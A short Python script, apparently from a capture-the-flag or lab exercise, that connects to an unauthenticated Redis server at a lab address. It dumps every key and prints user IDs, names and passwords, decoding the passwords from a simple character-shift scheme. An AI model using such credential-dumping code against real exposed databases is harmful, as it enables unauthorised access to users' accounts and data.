#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Wed 17 Mar 2021 04:54:34 PM CET
# db_dump.py
# Description:
import redis

def password(name):
    index = 0
    string = []
    while index < len(name):
        if name[index] == ')':
            string.append("A")
        else:
            string.append(chr(ord(name[index]) - 9))
        index += 1
    return "".join(string)

r = redis.Redis("10.10.11.143", 6379)
keys = r.keys("*")
pair = []

print("user_id,name,password")
for key in keys:
    name = r.get(key).decode("utf-8")
    print(key.decode("utf-8") + "," + name + "," + password(name))

